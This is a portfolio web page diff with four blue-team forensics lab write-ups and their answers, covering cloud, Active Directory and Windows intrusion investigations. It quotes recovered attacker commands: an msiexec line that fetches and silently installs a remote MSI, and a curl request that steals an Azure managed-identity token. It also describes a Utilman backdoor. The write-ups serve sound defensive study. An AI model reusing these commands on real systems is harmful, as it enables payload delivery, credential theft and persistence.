+<div id="lightbox" onclick="closeLightbox()">
+  <div id="lightbox-bar" onclick="event.stopPropagation()">
+    <span id="lightbox-label">🔍 CLICK OUTSIDE OR PRESS ESC TO CLOSE</span>
+    <button id="lightbox-close" onclick="closeLightbox()">✕ CLOSE</button>
+  </div>
+  <img id="lightbox-img" src="" alt="" onclick="event.stopPropagation()"/>
+</div>
+
+<div class="panel" id="panel">
+  <div class="panel-nav">
+    <div class="panel-logo">AM<span>://</span>sec</div>
+    <button class="panel-close" onclick="closePanel()">✕ Close</button>
+  </div>
+
+  <!-- dynamic header -->
+  <div class="panel-header">
+    <div class="panel-type"><div class="panel-dot"></div><span id="p-category"></span></div>
+    <div class="panel-title" id="p-title"></div>
+    <div class="panel-tags" id="p-tags"></div>
+  </div>
+
+  <!-- markdown content renders here -->
+  <div class="panel-body" id="p-body"></div>
+
+  <div class="panel-footer">
+    <button class="pf-link" onclick="closePanel()" style="background:none;border:none;cursor:pointer">← Back to investigations</button>
+    <a href="https://www.linkedin.com/in/abdeslem-merabti-61497a18a" target="_blank" class="pf-link">Connect on LinkedIn →</a>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════
+     WRITEUP CONTENT (embedded — no fetch needed)
+════════════════════════════════════════════════ -->
+<script>
+/* ─── METADATA ───────────────────────────────── */
+const WRITEUPS = {
+  'rotten-cloud': {
+    title:    'Rotten Cloud',
+    category: 'Cloud Investigation',
+    tags: [
+      {l:'BTLO · Trick or Threat 2025', c:'gold'},
+      {l:'Splunk · AWS · Azure',         c:'c'},
+      {l:'Cloud Forensics',              c:'g'},
+      {l:'Medium',                       c:''},
+      {l:'Incident Response',            c:''},
+    ]
+  },
+  'take-a-lap': {
+    title:    'Take a LAP',
+    category: 'Active Directory Investigation',
+    tags: [
+      {l:'BTLO Challenge',         c:'gold'},
+      {l:'FTK Imager · AD Explorer', c:'c'},
+      {l:'Digital Forensics',      c:'g'},
+      {l:'Medium',                  c:''},
+      {l:'Insider Threat',          c:''},
+    ]
+  },
+  'utensilmenace': {
+    title:    'UtensilMenace',
+    category: 'Incident Response',
+    tags: [
+      {l:'BTLO Challenge',       c:'gold'},
+      {l:'Zimmerman Tools',      c:'c'},
+      {l:'Windows IR · DFIR',    c:'g'},
+      {l:'Easy',                 c:''},
+      {l:'Windows DFIR',           c:''},
+    ]
+  },
+  'clicktrace': {
+    title:    'ClickTrace',
+    category: 'DFIR Investigation',
+    tags: [
+      {l:'BTLO Challenge',     c:'gold'},
+      {l:'Sysinternals Suite', c:'c'},
+      {l:'DFIR',               c:'g'},
+      {l:'Medium',             c:''},
+      {l:'C2 Analysis',        c:''},
+    ]
+  },
+};
+
+/* ─── CONTENT ────────────────────────────────── */
+const CONTENT = {};
+
+CONTENT['rotten-cloud'] = `
+<h2>🎯 Objective</h2>
+<p>Investigate Zeta-9's hybrid cloud environment using Splunk to determine whether a threat actor has pivoted into the infrastructure.</p>
+<h2>🧾 Lab Details</h2>
+<ul><li><strong>Platform:</strong> Blue Team Labs Online (BTLO)</li><li><strong>Event:</strong> Trick or Threat 2025</li><li><strong>Environment:</strong> Splunk Cloud</li><li><strong>Difficulty:</strong> Medium</li><li><strong>Category:</strong> Incident Response</li></ul>
+<h2>📖 Scenario</h2>
+<p>Zeta-9 Corporation operates a hybrid cloud infrastructure supporting its Quantum Research Division, where highly sensitive data is stored across secure cloud environments. Following the breach, C.R.I.S.I.S must extend their investigation into Zeta-9's cloud environment — analyzing activity, identifying signs of lateral movement, and determining whether the threat actor has already pivoted into the cloud infrastructure.</p>
+<hr/>
+<h2>🛠️ Tools Used</h2>
+<ul><li>Splunk</li><li>CyberChef</li></ul>
+<hr/>
+<h2>🔎 Investigation Overview</h2>
+<p>The investigation began by analyzing AWS CloudTrail logs within Splunk to trace the attacker's actions from initial access through lateral movement. With only 4028 events indexed, noise was low — making correlation easier. Multiple hosts and sources revealed both AWS and Azure cloud environments.</p>
+<img src="imgs/rc/lab-discovery.png" alt="Lab discovery"/>
+<hr/>
+<h2>Investigation</h2>
+<h3>Q1) Attacker's IP Address</h3>
+<p>Legitimate users worked from India. Filtering AWS CloudTrail for <code>sourceIPAddress</code> revealed two values — a domain name and an IP. OSINT confirmed the IP originated from the USA, not India.</p>
+<pre><code>index=* source="AWSCloudTrail.json" | sort _time</code></pre>
+<img src="imgs/rc/q1-ip.png" alt="Finding IP"/>
+<img src="imgs/rc/q1-osint.png" alt="OSINT on IP"/>
+<p><strong>Answer → 172.235.129.221</strong></p>
+<h3>Q2) Reconnaissance API Call on EC2</h3>
+<pre><code>index=* source="AWSCloudTrail.json" sourceIPAddress="172.235.129.221" | sort _time</code></pre>
+<p>Three events appeared. The first — matching the reconnaissance phase:</p>
+<img src="imgs/rc/q2-api.png" alt="AWS API Call"/>
+<p><strong>Answer → DescribeInstances</strong></p>
+<h3>Q3) SecretID Containing Windows Password</h3>
+<p>The second API call was <strong>GetSecretValue</strong> — retrieving stored credentials from Secrets Manager.</p>
+<img src="imgs/rc/q3-secret.png" alt="SecretID"/>
+<p><strong>Answer → zeta9/windows/admin-password</strong></p>
+<h3>Q4) S3 Buckets Targeted &amp; Files Downloaded</h3>
+<pre><code>index=* source="AWSCloudTrail.json" sourceIPAddress="172.235.129.221" eventName=GetObject | sort _time | table eventTime,requestParameters.bucketName,requestParameters.key</code></pre>
+<img src="imgs/rc/q4-buckets.png" alt="S3 Buckets"/>
+<p><strong>Answer → 3 unique buckets, 5 files downloaded</strong></p>
+<h3>Q5) Secret Web Portal URL</h3>
+<pre><code>index=* sourcetype=AppServiceHTTPLogs | sort _time</code></pre>
+<img src="imgs/rc/q5-url.png" alt="URL"/>
+<p><strong>Answer → zeta9-research-portal.azurewebsites.net</strong></p>
+<h3>Q6) Cross-Cloud Pivot Command</h3>
+<pre><code>index=* sourcetype=AppServiceHTTPLogs CIp="172.235.129.221" | sort _time</code></pre>
+<p>A URL-encoded command was found. After CyberChef URL decode:</p>
+<img src="imgs/rc/q6-decoded.png" alt="Decoded Command"/>
+<p><strong>Answer → <code>curl -H secret:4ebc6d54-f421-4321-81c4-fd9e29d28a0f 'http://169.254.130.3:8081/msi/token?api-version=2017-09-01&amp;resource=https://management.azure.com/'</code></strong></p>
+<h3>Q7) Azure Blob Container Targeted</h3>
+<pre><code>index=* sourcetype=StorageBlobLogs "172.235.129.221" | sort _time</code></pre>
+<img src="imgs/rc/q7-blob.png" alt="Blob Name"/>
+<p><strong>Answer → quantum-research-secrets</strong></p>
+<h3>Q8) Files Downloaded from Azure Blob</h3>
+<pre><code>index=* sourcetype=StorageBlobLogs "172.235.129.221" OperationName=GetBlob | sort _time | table ObjectKey, "TimeGenerated [UTC]"</code></pre>
+<img src="imgs/rc/q8-files.png" alt="Downloaded Files"/>
+<p><strong>Answer → 6 files</strong></p>
+<h3>Q9) Defaced Website URL</h3>
+<p>After commands like <code>ls -la</code> and <code>whoami</code>, the last attacker command in HTTP logs revealed the defacement URL.</p>
+<img src="imgs/rc/q9-defaced.png" alt="Defaced URL"/>
+<p><strong>Answer → https://pastebin.com/raw/sBEs83q3</strong></p>
+<hr/>
+<h2>✅ Conclusion</h2>
+<p>The attacker identified EC2 instances, retrieved Windows credentials via GetSecretValue, exfiltrated data from 3 S3 buckets, then pivoted into Azure by stealing an MSI token. They accessed the quantum-research-secrets blob container, downloaded 6 files, and defaced the organization's website. This underscores the risk of cross-cloud lateral movement and the importance of monitoring cloud API activity.</p>
+
+`;
+
+CONTENT['take-a-lap'] = `
+<h2>🎯 Objective</h2>
+<p>Forensic investigation of a Windows Active Directory environment — identify unauthorized access, analyze user accounts, review security policies, and uncover actions by a disgruntled administrator.</p>
+<h2>🧾 Lab Details</h2>
+<ul><li><strong>Platform:</strong> Blue Team Labs Online (BTLO)</li><li><strong>Environment:</strong> Windows Active Directory</li><li><strong>Difficulty:</strong> Medium</li><li><strong>Category:</strong> Digital Forensics</li></ul>
+<h2>📖 Scenario</h2>
+<p>The Track and Field Company implemented Microsoft LAPS for password rotation. One administrator — unhappy about not being selected to manage it — began accessing information beyond his authorization. We must analyze the AD environment to identify misconfigurations and trace his unauthorized activity.</p>
+<hr/>
+<h2>🛠️ Tools Used</h2>
+<ul><li>FTK Imager</li><li>AD Explorer</li></ul>
+<hr/>
+<h2>Lab Discovery</h2>
+<p>One disk image provided: <code>71289f71-0000-0000-0000-501f00000000.vhdx</code>. Added to FTK Imager to begin analysis.</p>
+<img src="imgs/lap/discovery.png" alt="Lab Discovery"/>
+<hr/>
+<h2>Investigation</h2>
+<h3>Q1) Hostname</h3>
+<p>Registry path: <code>ControlSet001\Control\ComputerName\ComputerName</code></p>
+<img src="imgs/lap/q1-q2.png" alt="Q1-Q2"/>
+<p><strong>Answer → WIN-ALN64CF5HR5</strong></p>
+<h3>Q2) Forest Root Domain</h3>
+<p><strong>Answer → lab.BTLO.com</strong></p>
+<h3>Q3) Non-Default Organizational Units</h3>
+<p>Found AD snapshot on Desktop: <code>ActiveDirectoryBackup_DONOTDELETE.dat</code>. Loaded into AD Explorer:</p>
+<img src="imgs/lap/q3.png" alt="OUs"/>
+<p><strong>Answer → Administrators, Employees, Servers, Workstations</strong></p>
+<h3>Q4) AD Attribute for User Property Flags</h3>
+<img src="imgs/lap/q4.png" alt="Q4"/>
+<p><strong>Answer → userAccountControl</strong></p>
+<h3>Q5) User with Password Never Expires</h3>
+<p>Flag <code>0x10000</code> = Password never expires. <strong>Kyla Cornell</strong> → userAccountControl = 66048 = <code>0x10200</code> ✓</p>
+<img src="imgs/lap/q5.png" alt="Q5"/>
+<p><strong>Answer → Kyla Cornell, 0x10200</strong></p>
+<h3>Q6) Disabled Account</h3>
+<p>Flag <code>0x0002</code> = Account disabled. <strong>Regina Kirk</strong> → userAccountControl = 514 = <code>0x202</code> ✓</p>
+<img src="imgs/lap/q6.png" alt="Q6"/>
+<p><strong>Answer → Regina Kirk, 0x202</strong></p>
+<h3>Q7) Username Not Matching firstname.lastname</h3>
+<img src="imgs/lap/q7.png" alt="Q7"/>
+<p><strong>Answer → Royce Nixon</strong> (username: roy.nix)</p>
+<h3>Q8) Admin-Created GPOs</h3>
+<p>4 GPOs total. Default ones excluded. Admin-created:</p>
+<img src="imgs/lap/q8.png" alt="Q8"/>
+<p><strong>Answer → LAPSSettings, PasswordEnforcement</strong></p>
+<h3>Q9) Policy Settings in LAPSSettings GPO</h3>
+<p>GPO report at <code>kibeth.admin\Desktop\{C7C87C1D-5529-495A-BD5A-1C86E435BC4B}</code>:</p>
+<img src="imgs/lap/q9.png" alt="Q9"/>
+<p><strong>Answer → Enable local admin password management, Name of administrator account to manage, Password Settings</strong></p>
+<h3>Q10) Password Policy in PasswordEnforcement GPO</h3>
+<p>File: <code>GptTmpl.inf</code> in the GPO's SecEdit folder</p>
+<img src="imgs/lap/q10.png" alt="Q10"/>
+<p><strong>Maximum Password Age → 71 | Minimum → 37 | Min Length → 14 | History Size → 12</strong></p>
+<h3>Q11) Microsoft Program for Password Rotation</h3>
+<p><strong>Answer → LAPS</strong></p>
+<h3>Q12) Group Allowed to View LAPS Passwords</h3>
+<img src="imgs/lap/q12-q13.png" alt="Q12"/>
+<p><strong>Answer → LAPSViewers</strong></p>
+<h3>Q13) Administrator Not in LAPSViewers</h3>
+<p><strong>Answer → William Turnstiles</strong></p>
+<h3>Q14) Extended Rights Holders for Workstations OU</h3>
+<p>Found <code>runninglaps.txt</code> at <code>william.turnstiles\AppData\Local\Microsoft\Windows</code>:</p>
+<img src="imgs/lap/q14.png" alt="Q14"/>
+<p><strong>Answer → NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\LAPSViewers</strong></p>
+<h3>Q15) Local Administrator Passwords</h3>
+<img src="imgs/lap/q15.png" alt="Q15"/>
+<p><strong>ADMIN-WORKSTATION → -Tn*N}Q&amp;%/_a#&gt;L<br/>WORKSTATION1 → DxTX.@)D[):w-#$</strong></p>
+<h3>Q16) First 6 Digits of LAPS Expiration Timestamp</h3>
+<p>LAPS stores expiration in <code>ms-Mcs-AdmPwdExpirationTime</code> using Windows FILETIME format (100-nanosecond intervals since Jan 1, 1601 UTC).</p>
+<img src="imgs/lap/q16.png" alt="Q16"/>
+<p><strong>Answer → 133716</strong></p>
+<hr/>
+<h2>✅ Conclusion</h2>
+<p>This investigation revealed how LAPS manages local admin passwords and how a disgruntled administrator accessed sensitive data he wasn't authorized to view. Account misconfigurations (never-expiring passwords, disabled accounts) and the lack of proper access controls enabled the insider threat. Monitoring user activity and enforcing least-privilege is critical.</p>
+<img src="imgs/lap/completion.png" alt="Completion"/>
+`;
+
+CONTENT['utensilmenace'] = `
+<h2>🎯 Objective</h2>
+<p>Digital forensics investigation on a Windows system — analyze a suspicious executable downloaded by the CEO's son, determine if it's malicious, and identify attacker activity and persistence mechanisms.</p>
+<h2>🧾 Lab Details</h2>
+<ul><li><strong>Platform:</strong> Blue Team Labs Online (BTLO)</li><li><strong>Environment:</strong> Windows</li><li><strong>Difficulty:</strong> Easy</li><li><strong>Category:</strong> Digital Forensics</li></ul>
+<h2>📖 Scenario</h2>
+<p>The CEO's son downloaded a game on his account that never launched. Suspecting malware, we must analyze the system, identify what happened, and determine whether malicious activity took place.</p>
+<hr/>
+<h2>🛠️ Tools Used</h2>
+<ul><li>Browser Artifacts</li><li>Zimmerman Tools</li><li>Event Logs</li></ul>
+<hr/>
+<h2>Parsing Commands</h2>
+<pre><code>.\EvtxeCmd\EvtxECmd.exe -d "...\winevt\Logs" --csv logs --csvf ALL-Logs.csv
+.\MFTECmd.exe -f "...\$MFT" --csv MFT --csvf Mft.csv
+.\MFTECmd.exe -f "...\$Extend\$J" --csv J --csvf J.csv</code></pre>
+<hr/>
+<h2>Investigation</h2>
+<h3>Q1) Last Logon Time of CEO's Son</h3>
+<p>Event ID <strong>4624</strong> (Successful Logon), filtered for user <code>myson</code>:</p>
+<img src="imgs/um/q1.png" alt="Q1"/>
+<p><strong>Answer → 2025-04-27 07:44:04</strong></p>
+<h3>Q2) Full Path of Suspicious Executable</h3>
+<p>Browser history showed the game was <strong>FeedingFrenzy</strong>. MFT search revealed the full path:</p>
+<img src="imgs/um/q2.png" alt="Q2"/>
+<p><strong>Answer → C:\Users\myson\Desktop\Games\tmp\vmware\release\Feeding_Frenzy_Win_Preinstalled_EN\Game Files\FeedingFrenzy.exe</strong></p>
+<h3>Q3) SHA1 Hash of Executable</h3>
+<p>Executable was removed (likely by AV). Parsed Amcache instead:</p>
+<pre><code>.\AmcacheParser.exe -f "...\Amcache.hve" --csv Amcache --csvf Amcache.csv</code></pre>
+<img src="imgs/um/q3.png" alt="Q3"/>
+<p><strong>Answer → 9a8755180de66a990af80cfc0e32dc0f7cb25643</strong></p>
+<h3>Q4) Download URL</h3>
+<p>Edge browser History DB opened in DB Browser for SQLite:</p>
+<img src="imgs/um/q4.png" alt="Q4"/>
+<p><strong>Answer → http://freegamebychicken.wowza/release/FeedingFrenzy.zip</strong></p>
+<h3>Q5) Previous Suspicious Binary &amp; IP</h3>
+<img src="imgs/um/q5.png" alt="Q5"/>
+<p><strong>Answer → C:\Users\myson\Downloads\reverse.exe, 192.168.189.129</strong></p>
+<h3>Q6) Execution Count &amp; Last Execution Time</h3>
+<p>Used <strong>UserAssist</strong> registry artifact:</p>
+<img src="imgs/um/q6.png" alt="Q6"/>
+<p><strong>Answer → 3 times, 2025-04-27 07:26:15</strong></p>
+<h3>Q7) Second Executable Run by Attacker</h3>
+<p>Prefetch analysis showed <code>ipconfig.exe</code> — used for network reconnaissance:</p>
+<img src="imgs/um/q7.png" alt="Q7"/>
+<p><strong>Answer → ipconfig.exe</strong></p>
+<h3>Q8–Q11) Privilege Abuse &amp; Binary Replacement</h3>
+<p><code>whoami.exe</code> revealed <strong>SeRestorePrivilege</strong> — allows bypassing file permissions to restore/replace protected files. USN Journal ($J) showed <code>Utilman.exe</code> renamed to <code>utilman.old</code>, then replaced by <code>cmd.exe</code>.</p>
+<p>This is the <strong>Sticky Keys / Utilman backdoor</strong> — pressing Win+U at the logon screen launches CMD with SYSTEM privileges, bypassing authentication entirely. MITRE: <strong>T1546.008 – Accessibility Features</strong></p>
+<img src="imgs/um/q9-q10.png" alt="Q9-Q10"/>
+<p><strong>Q8 → SeRestorePrivilege | Q9 → Utilman.exe → utilman.old | Q10 → cmd.exe | Q11 → T1546.008</strong></p>
+<h3>Q12) Key Combination &amp; Protocol</h3>
+<p>Utilman backdoor triggers via <strong>Win + U</strong>. RDP connection from malicious IP confirmed remote access:</p>
+<blockquote><p>2025-04-27 07:30:54 → RDP server accepted connection from 192.168.189.129</p></blockquote>
+<p><strong>Answer → Windows + U, RDP</strong></p>
+<h3>Q13 &amp; Q14) Registry Persistence</h3>
+<p>Suspicious entry found at <code>Microsoft\Windows\CurrentVersion\Run</code>:</p>
+<img src="imgs/um/q13-q14.png" alt="Q13-Q14"/>
+<p><strong>Q13 → 2025-04-27 07:38:07 | Q14 → DoraExplorer, C:\Windows\exploer.exe</strong></p>
+<h3>Q15) Malicious File First Appearance</h3>
+<p>USN Journal ($J) tracked <code>exploer.exe</code> — deliberate typo for masquerading:</p>
+<img src="imgs/um/q15.png" alt="Q15"/>
+<p><strong>Answer → 2025-04-27 07:35:01, original name: FeedingFrenzy.exe</strong></p>
+<h3>Q16 &amp; Q17) Persistence via Malicious Service</h3>
+<p>Event ID <strong>7045</strong> (Service Installed) + Registry <code>ControlSet001\Services\</code>:</p>
+<img src="imgs/um/q16-q17-op2.png" alt="Q16-Q17"/>
+<p><strong>Q16 → WindowsUpdateHarder | Q17 → 2025-04-27 07:39:14</strong></p>
+<hr/>
+<h2>✅ Conclusion</h2>
+<p>Full attack chain from game download → SeRestorePrivilege abuse → Utilman backdoor → SYSTEM access via RDP. Persistence achieved through registry run keys AND a malicious service. The attacker used masquerading (exploer.exe), legitimate tool abuse, and binary replacement — a textbook Windows privilege escalation and persistence scenario.</p>
+<img src="imgs/um/completion.png" alt="Completion"/>
+`;
+
+CONTENT['clicktrace'] = `
+<h2>🎯 Objective</h2>
+<p>Incident response investigation following a SOC alert on suspicious outbound communications — identify the infection chain, analyze the malicious installer and C2 activity, and extract key IOCs.</p>
+<h2>🧾 Lab Details</h2>
+<ul><li><strong>Platform:</strong> Blue Team Labs Online (BTLO)</li><li><strong>Environment:</strong> Windows</li><li><strong>Difficulty:</strong> Medium</li><li><strong>Category:</strong> Digital Forensics And Incident Response</li></ul>
+<h2>📖 Scenario</h2>
+<p>SOC triggered an alert on suspicious external IP communications. The machine was isolated for IR triage. Through rapid containment, post-compromise activities including data exfiltration and ransomware deployment were prevented.</p>
+<hr/>
+<h2>🛠️ Tools Used</h2>
+<ul><li>Browser Artifacts</li><li>Zimmerman Tools</li><li>Sysinternals Suite</li></ul>
+<hr/>
+<h2>Parsing Commands</h2>
+<pre><code>.\EvtxeCmd\EvtxECmd.exe -d "...\winevt\logs" --csv Logs --csvf ALL-Logs.csv
+.\MFTECmd.exe -f "...\$MFT" --csv MFT --csvf Mft.csv
+.\MFTECmd.exe -f "...\$Extend\$J" --csv J --csvf J.csv</code></pre>
+<hr/>
+<h2>Investigation</h2>
+<h3>Q1) Malicious URL That Started the Chain</h3>
+<p>Browser history showed one URL with the suspicious title <em>"Checking if you are human"</em> — a classic social engineering lure:</p>
+<img src="imgs/ct/q1.png" alt="Q1"/>
+<p><strong>Answer → https://tinyurl.com/57ecjnrm</strong></p>
+<h3>Q2) MITRE Technique for Execution Phase</h3>
+<p>This is a <strong>ClickFix attack</strong> — the user is tricked into executing malicious content through fake verification steps. MITRE: <strong>T1204.004 – User Execution: Malicious Copy and Paste</strong></p>
+<p><strong>Answer → T1204.004</strong></p>
+<h3>Q3) SHA-256 Hash of Malicious Installer</h3>
+<p>RunMRU registry key revealed a suspicious command:</p>
+<pre><code>cmd /c "msiexec.exe /i https://raw.githubusercontent.com/a4dq/q/refs/heads/main/gt.msi /qn"</code></pre>
+<img src="imgs/ct/q3-p1.png" alt="Q3 P1"/>
+<p>Downloaded and hashed the MSI, then confirmed via Any.Run OSINT report for the correct hash used in this execution context:</p>
+<img src="imgs/ct/q3-p2.png" alt="Q3 P2"/>
+<p><strong>Answer → cbeaf0c9f54d0d8b31a292a704a1ec53a3e37fca197cfff76f1d578b156d81de</strong></p>
+<h3>Q4) First Drop Location</h3>
+<p>MFT search for <code>Engine-Switch.exe</code> revealed the first write location:</p>
+<img src="imgs/ct/q4-q5.png" alt="Q4-Q5"/>
+<p><strong>Answer → C:\Users\Administrator\AppData\Local\Amnesia</strong></p>
+<h3>Q5) Indicator Removal Technique</h3>
+<p>In the $MFT, Created Time and Modified Time were identical — indicating deliberate timestamp manipulation to evade forensic detection.</p>
+<img src="imgs/ct/q5.png" alt="Q5"/>
+<p><strong>Answer → T1070.006 (Indicator Removal: Timestomp)</strong></p>
+<h3>Q6) Executable for TCP/UDP &amp; Process Mapping</h3>
+<p>Procmon filter (Engine-Switch.exe → CreateFile) confirmed this binary was dropped for network mapping:</p>
+<img src="imgs/ct/q6-q7.png" alt="Q6-Q7"/>
+<p><strong>Answer → tcpvcon.exe</strong></p>
+<h3>Q7) VPN-Obfuscated C2 Binary</h3>
+<p>TCPView confirmed suspicious outbound connections tied to unusual ports, attributed to this executable:</p>
+<img src="imgs/ct/q6-q7-q8.png" alt="Q6-Q7-Q8"/>
+<p><strong>Answer → EtherHa.exe</strong></p>
+<h3>Q8) C2 Server IP</h3>
+<img src="imgs/ct/q8.png" alt="Q8"/>
+<p><strong>Answer → 217.138.194.181</strong></p>
+<h3>Q9) Persistence Mechanism File Path</h3>
+<p>Found suspicious scheduled task at <code>C:\Windows\System32\Tasks\CtrlTlsVT1</code>:</p>
+<pre><code>&lt;Command&gt;C:\ProgramData\nn_auth\Engine-Switch.exe&lt;/Command&gt;</code></pre>
+<img src="imgs/ct/q9.png" alt="Q9"/>
+<p><strong>Answer → C:\Windows\System32\Tasks\CtrlTlsVT1</strong></p>
+<hr/>
+<h2>✅ Conclusion</h2>
+<p>Full attack chain reconstructed: ClickFix lure → malicious MSI dropper → Engine-Switch.exe deployed → tcpvcon.exe for network mapping → EtherHa.exe for VPN-obfuscated C2 to 217.138.194.181 → scheduled task persistence. Defense evasion via timestomping and legitimate binary abuse. A textbook modern intrusion combining social engineering, living-off-the-land, and C2 obfuscation.</p>
+
+`;
+
+/* ─── PANEL LOGIC ─────────────────────────────────── */
+function openPanel(id) {
+  const meta = WRITEUPS[id];
+  if (!meta) return;
+
+  // Fill header
+  document.getElementById('p-category').textContent = meta.category;
+  document.getElementById('p-title').textContent    = meta.title;
+  document.getElementById('p-tags').innerHTML =
+    meta.tags.map(t => `<span class="panel-tag ${t.c}">${t.l}</span>`).join('');
+
+  // Fill body
+  document.getElementById('p-body').innerHTML = CONTENT[id] || '<p style="color:var(--muted)">Content not found.</p>';
+
+  // Open
+  document.getElementById('overlay').classList.add('open');
+  document.getElementById('panel').classList.add('open');
+  document.getElementById('panel').scrollTop = 0;
+  document.body.style.overflow = 'hidden';
+
+  // Wrap each image in a .img-wrap div for zoom hint + lightbox
+  document.querySelectorAll('#p-body img').forEach(img => {
+    const wrap = document.createElement('div');
+    wrap.className = 'img-wrap';
+    const hint = document.createElement('span');
+    hint.className = 'img-zoom-hint';
+    hint.textContent = '⊕ CLICK TO ENLARGE';
+    img.parentNode.insertBefore(wrap, img);
+    wrap.appendChild(img);
+    wrap.appendChild(hint);
+    wrap.addEventListener('click', () => openLightbox(img.src, img.alt));
+  });
+}
+
+function closePanel() {
+  document.getElementById('overlay').classList.remove('open');
+  document.getElementById('panel').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+/* ─── LIGHTBOX ────────────────────────────────────── */
+function openLightbox(src, alt) {
+  const lb  = document.getElementById('lightbox');
+  const img = document.getElementById('lightbox-img');
+  img.src = '';           // reset first so it re-renders sharp
+  img.src = src;
+  img.alt = alt || '';
+  lb.classList.add('active');
+}
+
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('active');
+  document.getElementById('lightbox-img').src = '';
+}
+
+// Escape closes lightbox first, then panel
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    const lb = document.getElementById('lightbox');
+    if (lb.classList.contains('active')) { closeLightbox(); return; }
+    closePanel();
+  }
+});
+
+/* ─── SCROLL REVEAL ───────────────────────────────── */
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('visible');
+      [...e.target.children].forEach((c, i) => { c.style.transitionDelay = `${i * 0.1}s`; });
+    }
+  });
+}, { threshold: 0.1 });
+document.querySelectorAll('.reveal').forEach(r => observer.observe(r));
+
+/* ─── TERMINAL ANIMATION ──────────────────────────── */
+document.querySelectorAll('.t-line').forEach((l, i) => {
+  l.style.opacity = '0';
+  setTimeout(() => { l.style.transition = 'opacity .3s'; l.style.opacity = '1'; }, 800 + i * 120);
+});
+</script>
+</body>
+</html>
